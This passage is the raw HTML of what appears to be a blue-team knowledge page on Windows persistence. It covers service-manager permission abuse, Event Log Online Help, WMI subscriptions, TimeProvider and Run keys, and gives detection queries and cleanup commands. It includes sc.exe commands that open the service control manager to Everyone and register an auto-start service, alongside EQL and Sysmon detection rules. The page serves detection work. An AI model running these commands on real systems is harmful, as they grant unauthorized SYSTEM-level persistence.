codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc sdshow scmanager</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The command below will enumerate the permissions of the “<em>scmanager</em>” utility and will display the associated SDDL rights.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc sdshow scmanager showrights</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>Tips</code></p><p>Users with standard level access they cannot create a service in Window  environments. This privilege belongs only to elevated users such as  Local Administrators. However, modification of the security descriptor  permissions for the service control manager could allow also any user to  create a service that will run under the context of the SYSTEM accoun</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc.exe sdset scmanager D:</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">KA</span><span class="token punctuation" style="color:#393A34">;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">WD</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><table><thead><tr><th>D</th><th>Discretionary Access Control List</th></tr></thead><tbody><tr><td>A</td><td>Access Control Entry – Access Allowed</td></tr><tr><td>KA</td><td>KEY_ALL_ACCESS – Rights</td></tr><tr><td>WD</td><td>Security Principal of Everyone Group</td></tr></tbody></table><p>after change permission everyone can create service </p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc create nooranet </span><span class="token assign-left variable" style="color:#36acaa">displayName</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;nooranet&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">binPath</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:</span><span class="token string entity" style="color:#36acaa">\t</span><span class="token string" style="color:#e3116c">emp</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">ss.exe&quot;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">start</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> auto</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detection-2">Detection<a href="#detection-2" class="hash-link" aria-label="لینک مستقیم به Detection" title="لینک مستقیم به Detection">​</a></h3><p><img loading="lazy" src="/t1/assets/images/sc-b5b6b7d80dcd79799b412ba223a21610.png" width="2866" height="1436" class="img_ev3q"></p><h2></h2><h2 class="anchor anchorWithStickyNavbar_LWe7" id="event-log-onlinehelp">Event Log Online Help<a href="#event-log-onlinehelp" class="hash-link" aria-label="لینک مستقیم به Event Log Online Help" title="لینک مستقیم به Event Log Online Help">​</a></h2><p>Microsoft in order to assist administrators to retrieve direct information for a particular event ID over the web has embedded a  functionality which is called Event Log Online Help.</p><p>The Event Log Online Help redirects the users to a Microsoft URL and is controlled from the following registry location.</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer&quot; /s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li><p>MicrosoftRedirectionProgram    REG_EXPAND_SZ</p></li><li><p>MicrosoftRedirectionProgramCommandLineParameters    REG_SZ</p></li><li><p>MicrosoftRedirectionURL    REG_SZ    <a href="http://go.microsoft.com/fwlink/events.asp" target="_blank" rel="noopener noreferrer">http://go.microsoft.com/fwlink/events.asp</a></p></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detection-3">Detection<a href="#detection-3" class="hash-link" aria-label="لینک مستقیم به Detection" title="لینک مستقیم به Detection">​</a></h3><p><img loading="lazy" src="/t1/assets/images/event-4b2b3e2180d3bd388a406db540bae965.png" width="2868" height="1424" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="wmi-persistent">WMI Persistent<a href="#wmi-persistent" class="hash-link" aria-label="لینک مستقیم به WMI Persistent" title="لینک مستقیم به WMI Persistent">​</a></h2><p>WMI is comprised of a powerful set of tools used to manage Windows systems both locally and remotely .An example of a managed component in WMI would be a running process, registry key, installed service, file information, and so on.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="auditing-wmi---powershell">Auditing WMI - Powershell<a href="#auditing-wmi---powershell" class="hash-link" aria-label="لینک مستقیم به Auditing WMI - Powershell" title="لینک مستقیم به Auditing WMI - Powershell">​</a></h3><p>Event Filter</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Event Consumer </p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>FIlterToConsumer</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="auditing-wmi-sysmon">Auditing WMI Sysmon<a href="#auditing-wmi-sysmon" class="hash-link" aria-label="لینک مستقیم به Auditing WMI Sysmon" title="لینک مستقیم به Auditing WMI Sysmon">​</a></h2><p>WMI EventFilter activity</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Event ID : 19</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>WMI Event Consumer</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Eent ID : 20</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>WMI EventConsumerToFilter</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Event ID : 21</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="other-wmi-artifacts">Other WMI Artifacts<a href="#other-wmi-artifacts" class="hash-link" aria-label="لینک مستقیم به Other WMI Artifacts" title="لینک مستقیم به Other WMI Artifacts">​</a></h3><p>offline Repository </p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\System32\wbem\Repository</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Event Viewer </p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="auditing-wmi-with-elk">Auditing WMI with ELK<a href="#auditing-wmi-with-elk" class="hash-link" aria-label="لینک مستقیم به Auditing WMI with ELK" title="لینک مستقیم به Auditing WMI with ELK">​</a></h3><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">process where  process.name : &quot;wmic.exe&quot; and</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  process.args : (&quot;ActiveScriptEventConsumer&quot;, &quot;CommandLineEventConsumer&quot;)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>powershell</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">process  where  process.args : (&quot;*instancemodificationonevent*&quot; , &quot;*commandlineeventconsume*&quot; , &quot;*Eventfilter*&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">and ( 10 / process.args_count ) == 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="remove-wmi">Remove WMI<a href="#remove-wmi" class="hash-link" aria-label="لینک مستقیم به Remove WMI" title="لینک مستقیم به Remove WMI">​</a></h3><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&#x27;Nooranet-WMI&#x27;&quot; | Remove-WmiObject -verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#x27;Nooranet-WMI&#x27;&quot; | Remove-WmiObject -verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &#x27;%Nooranet-WMI%&#x27;&quot; | Remove-WmiObject -verbos</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-1"><a href="#-1" class="hash-link" aria-label="لینک مستقیم به -1" title="لینک مستقیم به -1">​</a></h2><h2 class="anchor anchorWithStickyNavbar_LWe7" id="persistent-via-timeprovider">Persistent Via TimeProvider<a href="#persistent-via-timeprovider" class="hash-link" aria-label="لینک مستقیم به Persistent Via TimeProvider" title="لینک مستقیم به Persistent Via TimeProvider">​</a></h2><p><code>Sysmon</code></p><ul><li><p>Create and Delete : 12</p></li><li><p>Registry Value Set : 13</p></li><li><p>Registry Key and Value Rename : 14</p></li></ul><p>EQL </p><div class="language-EQL codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-EQL codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">registry where event.type:&quot;change&quot; and registry.path : &quot;HKLM\\SYSTEM\\*ControlSet*\\Services\\W32Time\\TimeProviders\\*&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> and registry.data.strings:&quot;*.dll&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">and user.name != &quot;system&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="malware-persistent">Malware Persistent<a href="#malware-persistent" class="hash-link" aria-label="لینک مستقیم به Malware Persistent" title="لینک مستقیم به Malware Persistent">​</a></h2><h4 class="anchor anchorWithStickyNavbar_LWe7" id="auto-start--persistent-location">Auto start  persistent location<a href="#auto-start--persistent-location" class="hash-link" aria-label="لینک مستقیم به Auto start  persistent location" title="لینک مستقیم به Auto start  persistent location">​</a></h4><ul><li><p>Ntuser.dat\software\Microsoft\Windows\Currentversion\run</p></li><li><p>Ntuser.dat\software\Microsoft\Windows\Currentversion\runonce</p></li><li><p>software\Microsoft\Windows\Currentversion\run</p></li><li><p>software\Microsoft\Windows\Currentversion\runonce</p></li><li><p>software\Microsoft\Windows\currentversion\policies\Explorer\Run</p></li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detction">Detction<a href="#detction" class="hash-link" aria-label="لینک مستقیم به Detction" title="لینک مستقیم به Detction">​</a></h3><h5 class="anchor anchorWithStickyNavbar_LWe7" id="sysmon-event-id-121314">Sysmon Event ID 12,13,14<a href="#sysmon-event-id-121314" class="hash-link" aria-label="لینک مستقیم به Sysmon Event ID 12,13,14" title="لینک مستقیم به Sysmon Event ID 12,13,14">​</a></h5><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;Sysmon schemaversion=&quot;4.30&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;EventFiltering&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;RuleGroup name=&quot;&quot; groupRelation=&quot;or&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &lt;RegistryEvent onmatch=&quot;include&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                &lt;TargetObject name=&quot;NSS-run&quot; condition=&quot;contains&quot;&gt;\CurrentVersion\Run&lt;/TargetObject&gt;                </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            &lt;/RegistryEvent&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &lt;/RuleGroup&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;/EventFiltering&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/Sysmon&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="کپی به کلیپ‌بورد" title="کپی" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 